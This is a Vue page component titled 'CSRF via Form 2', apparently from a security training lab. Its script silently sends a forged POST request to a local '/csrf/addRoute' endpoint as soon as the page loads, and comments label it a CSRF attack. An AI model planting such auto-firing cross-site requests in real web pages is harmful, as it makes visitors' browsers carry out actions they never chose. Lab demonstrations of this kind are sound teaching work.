<template>
  <div>
    <v-row>
      <v-col>
        <div class="d-flex justify-space-between align-center mb-6">
          <h1 class="text-h3">CSRF via Form 2</h1>
        </div>

        <img src="/snail-151802_1280.png" height="200">
      </v-col>
    </v-row>
  </div>
</template>

<script setup lang="ts">
  import { ref, onMounted } from 'vue'

  // CSRF attack in background - no form needed!
  function executeCSRFAttack() {
    const formData = new FormData();
    formData.append('route', "you'll never know what hit you");

    fetch('http://localhost:8080/csrf/addRoute', {
      method: 'POST',
      body: formData
    })
    .then(response => {
      console.log("CSRF attack completed in background:", response.status);
      return response.text();
    })
    .then(data => {
      console.log("Server response:", data);
    })
    .catch(error => {
      console.log("CSRF attack failed:", error);
    });
  }

  onMounted(() => {
    // Execute the attack automatically when page loads
    executeCSRFAttack();
  })
</script>